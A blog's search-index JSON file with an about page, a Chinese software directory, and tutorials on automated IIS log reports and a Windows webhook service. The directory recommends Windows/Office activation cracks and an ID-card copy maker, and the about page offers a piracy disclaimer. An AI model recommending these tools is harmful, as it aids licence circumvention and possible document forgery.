{"meta":{"title":"搜百谷","subtitle":"达则兼济天下尤物，科技改变世界嫩模！","description":"互联网精神病患者小站，始终秉承建站理念：分享是种美德，好人一生平安。","author":"凹凸曼","url":"https://sobaigu.com","root":"/"},"pages":[{"title":"","date":"2024-09-28T00:17:21.251Z","updated":"2024-09-28T00:17:21.251Z","comments":true,"path":"/404.html","permalink":"https://sobaigu.com/404.html","excerpt":"","text":"啊~哦~ 您要查看的页面找不到了！ 请检查您输入的网址是否正确，使用右上角功能按关键词搜索或回到网站首页"},{"title":"关于本站","date":"2024-09-28T00:17:21.273Z","updated":"2024-09-28T00:17:21.273Z","comments":true,"path":"about/index.html","permalink":"https://sobaigu.com/about/index.html","excerpt":"","text":"这是个互联网精神病患者个人小站，完全出于兴趣爱好维护，乐于分享计算机相关使用方法，推广优质实用软件。所有技术类文章除特别说明外均为本站原创，所提供的软件为原创或由网络整理而来。 本站始终坚信： 分享是种美德，好人一生平安！ 本着尊重国家法律的精神，根据中华人民共和国国务院令第632号规定： 第十七条 为了学习和研究软件内含的设计思想和原理，通过安装、显示、传输或者存储软件等方式使用软件的，可以不经软件著作权人许可，不向其支付报酬。 本站所有资源均为学习，交流使用，不得用于任何商业用途。使用的软件请下载后24小时内自行删除，若由于研究学习本站提供文件或链接下载的软件而带来损失，本站不负任何责任。 如果您发现本站侵害了您的权益，请联系站长并出示版权等举证证明，我们将第一时间进行相关处理。 如果您也一样热爱互联网，喜欢捣鼓软件，欢迎评论留言或者联系站长： GoogleVioce +1-(863) 576-4595‬ //长期网页挂机，接不了电话，请发简讯"},{"title":"archives","date":"2020-07-18T06:14:40.000Z","updated":"2020-07-18T06:14:40.000Z","comments":true,"path":"archives/index.html","permalink":"https://sobaigu.com/archives/index.html","excerpt":"","text":""},{"title":"","date":"2020-07-15T12:56:06.000Z","updated":"2020-07-15T12:56:06.000Z","comments":true,"path":"categories/index.html","permalink":"https://sobaigu.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2016-12-31T10:09:56.000Z","updated":"2016-12-31T10:09:56.000Z","comments":false,"path":"history/index.html","permalink":"https://sobaigu.com/history/index.html","excerpt":"","text":""},{"title":"","date":"2017-02-24T09:37:05.000Z","updated":"2017-02-24T09:37:05.000Z","comments":true,"path":"tags/index.html","permalink":"https://sobaigu.com/tags/index.html","excerpt":"","text":""},{"title":"给父老乡亲整理的软件宝库","date":"2016-12-31T16:00:00.000Z","updated":"2017-01-22T12:45:00.000Z","comments":false,"path":"software/index.html","permalink":"https://sobaigu.com/software/index.html","excerpt":"","text":"由于兴趣爱好，硬盘里存的各种软件比党员先进性教育片还多，趁有空整理了一遍，刚好挂到自己的博客上，特供父老乡亲挑选. 为什么要整理这么一个页面? 呃，做这个事纯属兴趣爱好，闲得蛋疼学姿势…大部分是绿色，去广告，免注册版，经典款，免费软件…如果实在没什么比官方好的，那进入传送门就直接到官网了，免得父老乡亲度娘一下找到葫芦娃. 为什么有些传送门点进去是404页面? 软件太多，现在只整理了个索引页，链接都是用模板填充的，以后会逐个补齐详情和下载页文章，慢慢等着吧. 或者永远等不到，正如我们的生活，得不到的也许是更好的。 为什么很多软件不是最新版? 也许有些软件是过时了，自个儿甄别。况且，软件不是越新越好，够用稳定就行，只选对的. 即时通讯 聊天交友 软件名称 类别 简介 下载 腾讯QQ 聊天交友 企鹅帝国的根基，大名鼎鼎的QQ，也是一款做工精良的软件 传送门 腾讯TIM 聊天交友 轻聊的QQ，专注在线办公沟通，文档编辑分享，没有其他乱七八糟的功能 传送门 微信PC版 聊天交友 傍着QQ这棵大树迅速成长的聊天交友软件，生生把米聊给模仿死了 传送门 在线沟通 软件名称 类别 简介 下载 阿里旺旺 淘宝购物交流 阿里所有平台买卖双方沟通工具，发生纠纷时其沟通记录是官方唯一承认的有效凭证 传送门 YY语音 在线教育 游戏玩家及接受在线教育培训必备 传送门 办公学习 阅读器 软件名称 类别 简介 下载 Foxit Reader PDF阅读器 福昕这个阅读器小巧轻便，而且功能强大，添加注释移除水印等一应俱全，完胜阿逗比那套笨重的PDF套装 传送门 PDF-XChange Viewer Pro PDF阅读器 跟foxit reader一样强大的PDF阅读器，PDF编辑器 传送门 PDFShaper PDF转换 多功能PDF工具集合可以把PDF转成 Word，PDF 转图像，PDF 加密等等 传送门 PDGreader pro PDG阅读器 超星阅读器的替代，这个格式现在比较少见了，当年大学图书馆文档库里大量这样的文档，留着备用 传送门 文档编辑 软件名称 类别 简介 下载 WPS Office 文档编辑 金山开发的良心软件，免费而且有各平台版本，完全不需要微软office 传送门 MS Office 文档编辑 微软的office，功能大而全，也确实做的不错，但是太笨重了，普通人用用还是选WPS吧 传送门 WinHex 文档编辑 16进制编辑器，更是数据恢复神器 传送门 Sublime Text 文本编辑 一款优雅的文本编辑器，有各种功能扩展支持，扩展用的好就是个强大的IDE 传送门 Notepad++ 文本编辑 功能强大的文本编辑工具，提供丰富的扩展支持，几乎可以实现所有的文本处理，也可以用来做编程IDE 传送门 Notepad2-mod 文本编辑 Windows自带记事本的绝佳替代，Notepad2的修改版，可以代码高亮，也不会编辑文件后乱码，单文件小巧轻便 传送门 Atom MarkDown编辑 跨Windows和OSX平台，免费且开源的软件，GitHub出品，原生支持MarkDown语法，支持Git版本状态显色，32位Linux系统安装见此 传送门 Moeditor MarkDown编辑 跨所有平台，免费且开源的软件，小清新风格界面简洁的MarkDown编辑器，可分栏实时预览最终效果，可惜不支持目录管理 传送门 Typora MarkDown编辑 MarkDown编辑器首选，跨平台，安装包也不算大，界面优雅，单窗口所见即所得，还有编辑表格和数学公式的功能，各种格式一个快捷键就完成，唯一遗憾的是不支持目录管理和标签窗口，仍值得拥有。 传送门 学习辅助 软件名称 类别 简介 下载 ougishi 小工具 作者及公司都不详，挺有意思的小软件，可以帮您实现成为书法家的梦想，用电脑生成毛笔字 传送门 Ditto 辅助编辑 一个剪贴板记录工具，重复复制粘贴操作时挺方便 传送门 灵格斯词典 词典 免费的词典，虽然是个个人作品，但查词还是很不错的 传送门 金山词霸 词典 金山出品，现在已经免费了，学渣还想翻墙，看英文文档等必备 传送门 思维导图 软件名称 类别 简介 下载 EdrawSoft mind map 思维导图 亿图图示有免费版，思维导图，流程图，拓扑图，装修等各种商业图都能用，推荐使用 传送门 MindManager 思维导图 老牌思维导图软件，现在国内公司代理后反盗版有点厉害 传送门 原型设计 软件名称 类别 简介 下载 AxureRP 原型设计 一个专业的快速原型设计工具，让负责定义需求和规格、设计功能和界面的专家能够快速创建应用软件或Web网站的线框图、流程图、原型和规格说明文档 传送门 Pencil 原型设计 Pencil 是一款开源的原型图绘制工具，手绘风格的，就像自己在纸上画的那样。Pencil 还可以用来绘制各种架构图和流程图 传送门 文件处理 软件名称 类别 简介 下载 BCompare 文件比较 文件或文件夹比较工具，使用该工具可以可视化和调整差异，合并修改，同步文件夹 传送门 FastCopy 文件复制 文件复制工具，比系统自带的复制速度快多了 传送门 Total Commander 文件处理 比较经典的一个工具，也比较老了，可以实现文件批量操作改名，复制，传送等功能 传送门 下载播放 播放器 软件名称 类别 简介 下载 PotPlayer 视频播放 原Kmplayer作者的另一个作品，它体积小巧、界面简洁、解码功能强大，是本地视频播放器的不二之选 传送门 Splayer（射手影音） 视频播放 大名鼎鼎的字幕组网站射手网出品的射手播放器，能自动搜索对应字幕，看外语片必备 传送门 吉吉影音 视频播放 一个快播倒下了了，然后就有千千万万的快播站起来，支持种子播放，边播边下 传送门 酷狗音乐 音乐播放 酷狗音乐是国内最大最专业用户最多的P2P音乐共享软件，支持无损和高音质音乐共享下载 传送门 传输工具 软件名称 类别 简介 下载 迅雷 下载工具 国内老牌下载软件，下载界的战斗机 传送门 IDM 下载工具 IDM下载器是国内外优秀下载工具，支持IE, Firefox, Chrome等所有浏览器，兼容所有Windows平台 传送门 BitComet BT下载 BitComet(比特彗星)是一款免费的BT/HTTP/FTP下载软件，也是一款种子发布器 传送门 BitTorrent Sync BT下载 BT sync 是一个免费文件同步工具，让你在几台不同的设备之间同步文件，只需要一串提取码即可与朋友分享各种文件 传送门 FlashFXP FTP工具 老牌FTP/FXP传输必备软件，功能强大最常用的FTP，FXP，FTPS，SFTP上传下载必备工具 传送门 TFtpd TFTP工具 小型文件传输协议程序，可以搭建小型文件服务器，也可以用来引导计算机网络启动，网络安装系统，最常见的是用来升级路由ROM 传送门 Syncthing 同步工具 免费开源的数据同步软件，有个常年开机的机器的话做自己的私有云盘是可以的 传送门 资源搜索 软件名称 类别 简介 下载 比目鱼 BT搜索 一款超级强大的基于各大BT搜索引擎的资源搜索工具，配合科学上网，什么老师都能搜到 传送门 迅雷资源助手 BT搜索 一款搜索下载资源的p2p种子搜索器、番号搜索器，绿色软件，可以进行磁力搜索，电驴搜索，种子搜索 传送门 BT_FileResolver(BT种子解析器) 种子解析 有好几万个BT种子文件，想找一些感兴趣的下载，如果一个一个种子的用迅雷打开看看有没有想下的就很费劲，这个软件能把种子内的文件都读出来，并且可以指定条件查找和排序 传送门 多媒体类 截图录像 软件名称 类别 简介 下载 FSCapture 截图录像 集图像捕捉、浏览编辑、视频录制等功能于一身！堪称截图神软，小巧和强悍，使用过程易上手，很流畅，各种设置，使截图有了超越其本身的创造性，不但具有常规截图等功能，更有从扫描器获取图像，和将图像转换为 PDF 文档等功能 传送门 GifCam 屏幕录像 原生单执行文件，小巧、免费的录制电脑屏幕并制作成GIF动画的工具，具有精确录制、可剪辑等特色，用来录制GIF动画教程很不错 传送门 CamtasiaStudio 屏幕录像 由顶级开发公司TechSmith出品的 Camtasia Studio 包含了屏幕录像、视频编辑、视频菜单制作、视频录音配音、视频发布等一系列的强大功能的专业录屏与视频创作大型软件 传送门 图像处理 软件名称 类别 简介 下载 Adobe Photoshop 图像处理 传说中的“PS”，是一个由Adobe开发和发行的图像处理软件。主要处理以像素所构成的数字图像，使用其众多的编修与绘图工具，可以有效地进行图片编辑工作 传送门 Adobe Photoshop Lightroom 图像后期 Lightroom是Adobe 研发的一款以后期制作为重点的图形工具软件，面向数码摄影、图形设计等专业人士和高端用户 传送门 光影魔术手 图像处理 光影魔术手是一款免费图像处理工具，简单、易用，其独特的效果处理更是深得用户喜爱 传送门 证照之星 证照 证照之星是证件照片制作软件，具有一键裁剪， 智能背景替换，批量制作、内置证照规格的四大优势。 传送门 身份证复印件 证照 身份证复印件制作软件，功能如其名，属于敏感软件，不要拿去做坏事。 传送门 图形设计 软件名称 类别 简介 下载 Adobe Illustrator 素材制作 应用于出版、多媒体和在线图像的工业标准矢量插画的软件，作为一款非常好的矢量图形处理工具，Adobe Illustrator广泛应用于印刷出版、海报书籍排版、专业插画、多媒体图像处理和互联网页面的制作等 传送门 CorelDRAW 素材制作 CorelDRAW Graphics Suite由世界顶尖软件公司之一的加拿大的Corel公司开发的图形图像软件。其非凡的设计能力广泛地应用于商标设计、标志制作、模型绘制、插图描画、排版及分色输出等等诸多领域 传送门 AutoCAD 工业制图 工程制图必备软件CAD，可用于二维绘图、详细绘制、三维设计，具有良好的操作界面，通过交互菜单或命令行方式便可进行各种操作 传送门 proeWildfire 工业制图 pore是做产品设计最好的软件，是三维建模的领头羊之一 传送门 LogoDesign logo设计 简单直观的Logo设计软件，设计一个Logo只要几分钟 传送门 LogoMaker logo设计 不必是一个专业的标志设计师就可设计出高品质的公司Logo、企业徽标、网页签名、按钮、图标等 传送门 网页制作 软件名称 类别 简介 下载 Dreamweaver 网页编辑 Dreamweaver 经过重新设计，添加了新式界面和快速灵活的编码引擎，可让 Web 设计人员和前端开发人员更轻松地创建、编码和管理外观精美且适合任何屏幕大小的网站 传送门 Fireworks 图片切片 一款专为网络图形设计的图形编辑软件，它大大简化了网络图形设计的工作难度，无论是专业设计家还是业余爱好者，使用Fireworks都不仅可以轻松地制作出十分动感的GIF动画，还可以轻易地完成大图切割、动态按钮、动态翻转图等 传送门 图片浏览 软件名称 类别 简介 下载 2345Pic 图片查看 可以打开PDF，看gif图并可以按帧保存，附带简单的编辑功能，是2345众多软件中少有看得上眼的软件 传送门 传送门 光盘制作 软件名称 类别 简介 下载 UltraISO 启动盘 软碟通UltraISO是一款功能强大、方便实用的光盘映像ISO文件编辑制作工具，这款光盘映像文件制作/编辑/转换工具，可直接编辑ISO文件，从ISO中提取文件和目录 传送门 easyboot 启动盘 传送门 AutoPlayMediaStudio 光盘制作 传送门 ONES 光盘刻录 传送门 EasySysprep 驱动集成 传送门 网络互联 代理上网 软件名称 类别 简介 下载 Shadowsocks-影梭 代理 轻量级科学上网姿势，用于保护网络流量，加密数据传输，突破功夫网，从此视野不再局限于大中华区内网 传送门 Switchysharp for Chrome 代理扩展 没办法安装带PAC规则的代理工具时，可以安装此扩展，实现按需代理或者chrome浏览器全部代理访问。 传送门 网络抓包 软件名称 类别 简介 下载 WireShark 网络抓包 网络监控抓包不二之选，支持https协议，所有访问数据包一目了然。 传送门 HttpAnalyzer 网络抓包 传送门 Network Monitor 网络抓包 传送门 Fiddler 网络抓包 传送门 MiniSniffer 网络抓包 传送门 服务器架设 软件名称 类别 简介 下载 filezillaserver FTP服务端 开源免费且小巧的软件，用于搭建FTP服务器不二之选 传送门 hfs2 文件服务端 传送门 MyWebServer web服务端 传送门 lnmp web环境 LNMP一键安装包是一个用Linux Shell编写的可以为独立主机安装LNMP(Nginx/MySQL/PHP)生产环境的Shell程序 传送门 WNMP-lite web环境 Windows下最小的nginx+PHP+MySQL绿色集成运行环境 传送门 系统工具 必备软件 软件名称 类别 简介 下载 WinRAR 解压缩 传送门 HaoZip 解压缩 传送门 搜狗拼音 输入法 搜狗拼音输入法是电脑装机必备软件，版本有传统版和智慧版之分，其打字超准、词库超大、速度飞快、外观漂亮，因此使得输入操作变得事半功倍 传送门 搜狗五笔 输入法 传送门 QQ拼音 输入法 传送门 Windows微软运行库合集 依赖库 系统运行库就是支持大部分软件运行的基础，缺少的话会出现程序启动错误 传送门 系统安装， 软件名称 类别 简介 下载 HEU_KMS_Activator 系统激活 主要适用于Windows以及Office的VL版本，无需联网即可一键激活。经众多网友的测试使用，此版本激活成功率最高 传送门 Chew-WGA 系统激活 Win7系统无法激活时，可以使用这个工具试试 传送门 DriveTheLife 驱动安装 传送门 驱动精灵 驱动安装 传送门 WIMTOOL 系统定制 传送门 磁盘管理 软件名称 类别 简介 下载 分区助手 磁盘分区 传送门 分区G计算器 磁盘分区 传送门 DiskGenius 磁盘管理 传送门 Acronis Disk Director 磁盘管理 传送门 HDTunePro 磁盘检测 传送门 AS_SD_Benchmark 磁盘检测 传送门 Paragon Alignment Tool 磁盘整理 专业的磁盘分区4K无损对齐工具，不用重新格式化分区即可无损直接对齐操作 传送门 Defraggler Pro 磁盘整理 传送门 远程管理 软件名称 类别 简介 下载 SecureCRT 远程管理 SSH 客户端，支持 SSH2、SSH1、Telnet、Telnet/SSH、Relogin、Serial、TAPI、RAW 等协议，支持标签化SSH对话 传送门 Remote Desktop Organizer 远程管理 Remote Desktop Organizer 是一款 Windows 远程桌面管理软件，让你在同一个窗口内浏览到多个远程桌面的信息，方便 Windows 远程管理 传送门 TeamViewer 远程管理 TeamViewer是一个能在任何防火墙和NAT代理的后台用于穿透内网远程控制软件，用于实现远程支持、远程访问、远程管理、家庭办公及在线协作和会议 传送门 AnyDesk 远程管理 AnyDesk原生简体中文、绿色免费、单文件体积小巧，支持声音传输、支持画质设置、屏幕截图，重点还支持与远程电脑同步剪贴板 传送门 TTVNC 远程管理 TTVNC能跨过防火墙和路由器的VNC 软件，是个比较易用的远程遥控软件，只需要客户端和主控端验证码相同就可以连接了 传送门 Radmin 远程管理 Radmin号称是一款屡获殊荣的安全远程控制软件。 该软件支持从多个地点访问同一台电脑，并使用高级文件传输、远程关机、Telnet、操作系统集成的 NT 安全性系统支持，以及其它功能 传送门 Xshell 远程管理 Xshell 是一个运行于MS Windows平台上强大的 SSH, TELNET 和 RLOGIN 终端仿真器。用户可以从Windows PC上安全地访问Unix/Linux主机 传送门 MobaXterm 远程管理 MobaXterm是一款功能强大的远程监控软件，用户可以通过软件创建SSH，RDP，VNC，XDMCP，FTP，SFTP等终端，堪称一款豪华、全功能的终端软件 传送门 辅助工具 软件名称 类别 简介 下载 Autoruns 自启动管理 传送门 ProcessExplorer 进程管理 工具虽小，但作用很大，是一款软件爱好者必备利器。相比Windows系统自带的任务管理器，其优秀之处在于很方便地查看进程相关信息，如进程路径，参数，线程等，还可以查看TCPIP连接，进程关系，占用情况等 传送门 PCHunter 辅助工具 PC Hunter是功能强大的Windows系统信息分析查看及维护工具，同时也是强大的手工杀毒利器，用它不但可以查看各类系统信息，也可以揪出电脑中潜伏的病毒木马 传送门 ProcessMonitor 系统监控 进程文件，注册表，网络等行为监控，功能强大 传送门 TCP Monitor 网络连接监控 传送门 彗星助手 窗口探测 传送门 WinSpy 窗口探测 传送门 WinDug 调试工具 传送门 DebugView 调试工具 传送门 Universal Extractor 安装包监控 传送门 LookAndStop 主动防御 传送门 Hash 文件校验 传送门 fastcoll 文件校验 传送门 MD5修改器 文件校验 传送门 其他应用 软件名称 类别 简介 下载 VMware Workstation 虚拟机 VMware Workstation可在一部实体机器上模拟完整的网络环境，以及可便于携带的虚拟机器，提供用户可在单一的桌面上同时运行不同的操作系统，和进行开发、测试 、部署新的应用程序的最佳解决方案 传送门 VirtualBox 虚拟机 传送门 SuperSpeed 虚拟磁盘 传送门 Dism++ 系统清理 传送门 rolan 快捷管理 传送门 其他类别 软件破解 软件名称 类别 简介 下载 OllyDbg 逆向调试 传送门 IDA 逆向调试 传送门 eXeScope 程序修改 传送门 ResourceHacker 程序修改 传送门 数据恢复 软件名称 类别 简介 下载 WinHex 数据恢复 WinHex是16进制文件编辑器与磁盘编辑必备软件！它文件小、速度快，可用来检查和修复各种文件、恢复删除文件、硬盘损坏造成的数据丢失等 传送门 FinalData 数据恢复 传送门 Recuva 数据恢复 传送门 Android手机 聊天交友 软件名称 类别 简介 下载 QQ国际版 腾讯系 传送门 微信 腾讯系 传送门 旺信 阿里系 传送门 钉钉 阿里系 传送门 文档输入 软件名称 类别 简介 下载 WPS Office 文档处理 安卓版WPS，最佳移动办公软件，个人版永久免费，体积小速度快；独有手机阅读模式，字体清晰翻页流畅；完美支持微软Office、PDF等多种文档格式 传送门 搜狗拼音 输入法 搜狗拼音输入法安卓版，打字超准、词库超大、速度飞快、外观漂亮、用了让您爱不释手的输入法，是您装机必备的好选择 传送门 讯飞输入法 输入法 准确语音识别，流畅手写输入，还有漂亮的皮肤，要是没有广告就完美了 传送门 购物支付 软件名称 类别 简介 下载 淘宝 购物 传送门 天猫 购物 传送门 手机京东 购物 传送门 苏宁 购物 传送门 美团 购物 传送门 支付宝 支付 传送门 播放器 软件名称 类别 简介 下载 MX Player Pro 视频播放 传送门 速播影音 视频点播 传送门 酷狗音乐 音乐播放 传送门 Tumblr 视频点播 传送门 那好吧 视频点播 P2P聚合播放神器、宅男神器！随心随意让你想看的那种视频及图片播放，搜索栏输入“1024”获取你想要的 传送门 代理上网 软件名称 类别 简介 下载 Shadowsocks 代理 影梭，爬墙看敏感内容必备，有时候也用来做免流 传送门 UC浏览器 网页浏览 传送门 其他软件 软件名称 类别 简介 下载 挖财记账理财 记账 传送门 计算管家 计算器 传送门 Root Explorer 文件管理 传送门 Android电视 播放器 软件名称 类别 简介 下载 电视猫 数据恢复 传送门 泰捷视频 数据恢复 传送门 芒果TV 数据恢复 传送门 电视管理 软件名称 类别 简介 下载 沙发管家 数据恢复 传送门"}],"posts":[{"title":"网站服务器使用360星图自动分析IIS日志，并通过网页浏览","slug":"windows-iis-log-with-360xingtu-webview","date":"2024-05-25T07:03:04.000Z","updated":"2024-05-25T07:03:04.000Z","comments":true,"path":"windows-iis-log-with-360xingtu-webview.html","permalink":"https://sobaigu.com/windows-iis-log-with-360xingtu-webview.html","excerpt":"","text":"前言 最近刚好研究了 Windows Server IIS建站相关问题，做了些方便自己的小工作，友链里有网友写了篇比较好的教程，转载到本站以便后续参考。 有些小伙伴习惯使用 Windows Server，Windows 系统做网站服务器自然使用 IIS 作为网站服务端。由于 Windows Server 本身就是界面管理，所以网站管理套件相对薄弱一些，尤其是 IIS 日志分析更是没有几个简单易用的，其中日志分析360星图便是难得的有用工具。 360星图日志分析 360星图360旗下开发的网站日志分析工具，使用360网站卫士核心数据分析模块，转化为全新的 Web 日志分析系统，深入分析黑客攻击行为和异常访问，比如 Web 漏洞攻击识别、CC攻击识别、恶意爬虫扫描识别、异常访问识别等。 360星图不止支持 IIS 日志，同时也能识别 apache 和 nginx，使用也比较简单，可以快速生成直观的日志报告。 获取软件 可惜该软件早就不更新维护了，360网站卫士都要在2024年6月停服了，该软件涉及的分析规则还是加密的，可能要成为绝唱。 下载地址：网联基地下载 | 蓝奏云 | 百度网盘 | 网友服务器 配置使用 下载后解压到某目录，如 C:\\360xingtu，然后按需对软件进行基本的配置 .\\conf\\config.ini： 123456789101112131415161718#日志文件存放路径，可以是直接目录也可以是文件，如：d:\\logs\\1.log 或 d:\\logs\\#如果使用 d:\\logs\\ 的方式，并logs目录下存在其他文件夹则无法分析这些文件夹内的日志文件log_file:C:\\inetpub\\logs\\LogFiles\\W3SVC2#日志文件类型设置，1:自动识别iis/apache/nginx日志 2:自定义格式xingtu_logtype:1#是否生成Html分析报告(包括常规报告及安全分析报告)，1:不开启;2:开启common_analysis:2#默认host,建议替换 default 为网站域名，不带http://host:default#设置接收运行通知的邮件：软件停服了别想了xingtu_email:#是否作为定时任务，1:不作为定时任务;2:作为定时任务，只分析log_file指定目录下最新的日志文件schedule_analysis:2 以上配置指定 IIS 日志文件夹，作为定时任务，其他的基本上没配置的必要，直接点击根目录下的 bat 启动器就可以用了，小网站分析一次最新日志要不了几秒就能出报告。 实现网页浏览报告 360星图生成的报告保存在软件目录 .\\result 下，且文件名比较长，本地打开倒没什么，但最好进行处理下方便实现外部网页浏览。 添加IIS虚拟目录 打开 IIS 管理界面，新增个网站或者在某个网站上右键–》添加虚拟目录：别名 填自己喜欢的任何名字，如 report，物理路径 则指向360星图生成报告的 result 目录，点确定便完成了，这样便可以在服务器外通过网络访问目录下的报告。 自动改名及修正js路径 360星图默认生成的报告文件文件名较长，且含有中文字符，为方便浏览，将报告处理成有一定规律的文件名，后期直接按规律输网页地址就能看。 因为360星图的报告源码中引用了 /bin/ 路径资源，该路径名为敏感目录，直接用是不允许访问的，资源会出现 404 错误，所以需额外处理。为了方便处理，用了 BASH 相关命令功能，所以先在系统中安装个 Git 客户端。 1234567@echo offclsset path=%path%;C:\\Program Files\\Git\\usr\\bin\\;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git;set WORKDIR=&quot;%~dp0&quot;set LOGDIR=&quot;C:\\360xingtu\\result&quot;cd %LOGDIR%start git-bash &quot;%WORKDIR%\\auto-name.sh&quot; 以上 BAT 是 BASH 启动器，代码定义了报告路径和启动哪个 BASH。下方的 BASH 代码则实现修正 js 引用源和重命名报告文件。 12345678910111213141516list=$(ls u_ex*)for item in $&#123;list&#125;; do sed -i &quot;s/\\.\\.\\/bin\\/js\\/jquery\\.min\\.js/\\/\\/cdn\\.bootcdn\\.net\\/ajax\\/libs\\/jquery\\/3\\.7\\.1\\/jquery\\.min\\.js/g&quot; $item sed -i &quot;s/\\.\\.\\/bin\\/js\\/plug-in\\.js/\\/\\/cdn\\.bootcdn\\.net\\/ajax\\/libs\\/echarts\\/5\\.5\\.0\\/echarts\\.js/g&quot; $item suffix=$&#123;item##*.&#125; ex_name=$(echo $item | grep &quot;安全&quot;) m_name=$&#123;item:4:6&#125; if [[ $&#123;suffix&#125; == &quot;txt&quot; ]]; then t_name=$&#123;m_name&#125;_attacks.txt elif [[ $&#123;suffix&#125; == &quot;html&quot; &amp;&amp; $&#123;ex_name&#125; ]]; then t_name=$&#123;m_name&#125;_s.html else t_name=$&#123;m_name&#125;.html fi mv -f $item $t_namedone 执行完后，result 目录下的文件将会命名为 240519.html 之类的文件。那么在外部浏览器地址中输入：服务器域名或IP/report/240519.html 就能浏览报告了。 添加系统定时任务 为了让服务器自动生成报告和自动处理，将360星图和我们做好的自动处理 BAT 添加到系统定时任务，每天报告一次就行。 因为 IIS 使用 W3C 格式生成日志，日志中的时间为 UTC 时间，如果你服务器上使用的北京时间，那么日志中记录的时间要加8小时才是北京时间。为了减少思考，干脆取消 IIS 使用本地时间进行支件命名和滚动更新(U)，这样生成的文件和时间都与 UTC 同步： 让定时任务每日 07:59:59 执行 360星图启动器 cron.bat，这样刚好就能分析过去24小时的日志 晚几分钟启动我们前面做好的 BASH 启动器，如：auto-name.bat，具体时间自己调保证360星图统计报告已完成即可 如此，每日北京时间八点十几分就能在外网通过浏览器查看过去24小时的网站报告，比登录服务器本地浏览网页舒服多了。 转载来源 网站服务器使用360星图自动分析IIS日志，并通过网页浏览的保姆级教程 Windows Server 部署 webhook 服务，并注册为系统服务守护","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"},{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Windows Server 部署 webhook 服务，并注册为系统服务守护","slug":"webhook-install-as-service-in-windows-server","date":"2024-05-17T10:30:35.000Z","updated":"2024-05-17T10:30:35.000Z","comments":true,"path":"webhook-install-as-service-in-windows-server.html","permalink":"https://sobaigu.com/webhook-install-as-service-in-windows-server.html","excerpt":"","text":"前言 之前受某位友链大佬针对搜索引擎解析域名文章思路的启发，用闲置的小水管机做了个搜索引擎喂料方案。 为了图省事，直接用的 Windows 系统定时任务运行自动克隆代码仓库BAT，按固定的时间无脑从 GitHub 克隆仓库后发布。这样的方案确实省事，但也没法办法及时同步仓库中最新代码，因为还有个地方会自动将最新链接提交搜索引擎，这期间存在更新时间差，而且无更新时浪费小水管机流量资源。 故近日在小水管机上又加了个 webhook 监听程序，实现按需无时差同步代码。 需要用到的组件 webhook监听服务端：开源Go项目 webhook，可自行编译也可以直接下载对应二进制程序 Windows服务管理：这里用的 Windows Service Wrapper，见后文参考链接，不用第三方用 Windows 自己的服务注册方式也是可以的，目的只是为了将程序注册成系统服务守护，能实现目的就行 端口测试「可选」：telnet 或者 tcping 之类的都行 功能实现流程 sequenceDiagram actor Git客户端 Git客户端->>GitHub仓库: git push GitHub仓库->>webhook监听端: 触发webhook webhook监听端->>BAT: 运行预定程序 Note right of BAT: 自动 pull/clone及发布 webhook监听端-->>GitHub仓库: 返回webhook结果 GitHub仓库-->>Git客户端: git pull Windows Server 部署 webhook 监听服务 本来要实现自动按需更新部署的功能在 LInux 服务器上很容易就实现，这部分可见本站早期教程：Hexo博客Git-VPS部署完整记录。 或者可以安装个宝塔之类的再借助扩展功能也能容易实现，在纯 Windows Server 上稍微复杂一点，下面是实现步骤。 获取 webhook 监听程序 使用开源 Go 项目 webhook，可以自己编译，也可以直接下载作者已经编译好的二进制版本，Windows 下载 webhook-windows-amd64.tar.gz 解压到某个路径，如：C:\\inetpub\\webhook\\webhook.exe。 配置监听端 webhook.xml 监听端就是我们要部署在我们自己 Windows Server 上的服务，webhook.xml 中定义监听接口数据来源，对接口令，匹配条件等，以下是一个最简单的样本： 12345678910111213141516171819202122- id: auto-git execute-command: &quot;C:/inetpub/auto-git.bat&quot; # 要执行的程序 command-working-directory: &quot;C:/inetpub&quot; # 执行程序工作目录 response-message: Got the payload! # 执行后返回给发起端的信息 response-headers: - name: Access-Control-Allow-Origin value: &#x27;*&#x27; incomingpayload-content-type: application/json trigger-rule: and: - match: type: payload-hmac-sha1 secret: &quot;YOURSECRET&quot; # 设置一个对接口令 parameter: source: header name: X-Hub-Signature - match: type: value value: refs/heads/main # 触发这个webhook的来源分支名 parameter: source: payload name: ref 以上是 yaml 格式样板，JSON 格式大同小异，注意执行程序路径使用 / 符号，否则会有一个错误，要执行的 BAT 可见本站另外教程：一个BAT批处理实现HTML网页自动同步发布到Windows Server。 运行 webhook 测试 以上配置完成后，打开 powershell 或 cmd，执行以下命令： 1234# cmd 不同盘符切换路径需带 /d 参数cd C:\\inetpub\\webhook\\# 切换到程序所在路径webhook.exe -hooks webhook.yaml -verbose 如果开启了 Windows defender 防火墙，默认会提示是否放行 webhook.exe，如果没提示请在防火墙中添加程序或者 TCP: 9000 端口允许入站连接，控制台将显示如下结果，表示监听配置没错，这个 webhook 服务就搭建成功了： 12345[webhook] 2024/05/17 08:19:55 version 2.8.1 starting[webhook] 2024/05/17 08:19:55 attempting to load hooks from webhook.yaml[webhook] 2024/05/17 08:19:55 found 1 hook(s) in file[webhook] 2024/05/17 08:19:55 loaded: auto-git[webhook] 2024/05/17 08:19:55 serving hooks on http://0.0.0.0:9000/hooks/&#123;id&#125; hook 地址中的 &#123;id&#125; 为配置监听端 webhook.xml 中定义的 auto-git，假设 Windows Server 服务器公网 IP 为 1.2.4.8 或者将域名 x.y.z 解析到了该公网 IP，那么我们这个服务器上完整的 webhook 调用地址可以为： http://1.2.4.8:9000/hooks/auto-git http://x.y.z:9000/hooks/auto-git 在外网调用时，一般还需要在云服务器控制台安全组中放行 TCP: 9000 端口，然后在调用端使用以上 webhook 地址中的任何一个都可以。 测试端口是否正常可用 tcping： 12PS C:\\Users\\xxx&gt; tcping x.y.z 9000Ping tcp://x.y.z:9000(1.2.4.8:9000) - Connected - time=48.4695ms 此处如果控制台输出中文乱码，可以运行 chcp 65001 再启动 webhook 监听查看， 65001 代表编码方式为 utf-8，更多可以查看文末参考链接 注册系统服务守护 监听服务运行没问题那基本上可以注册成服务守护来运行监听了，这里使用 Windows Service Wrapper 来完成。 直接在项目仓库 release 